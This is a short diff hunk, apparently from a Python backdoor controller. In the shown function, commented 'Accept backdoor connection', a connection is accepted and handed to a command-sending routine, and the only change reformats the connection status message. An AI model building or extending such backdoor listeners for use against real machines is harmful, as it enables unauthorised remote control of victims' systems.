@@ -54,7 +54,7 @@ def accept_conn(): # Accept backdoor connection
 
     client_conn, client_addr = s.accept()
     
-    print(" [+] Connection has been established! " + "IP: " + client_addr[0] + " Port: " + str(client_addr[1] ) + "\n")
+    print(" [+] Connection has been established | " + "IP: " + client_addr[0] + " | Port: " + str(client_addr[1] ) + "\n")
     send_commands(client_conn)
 
 
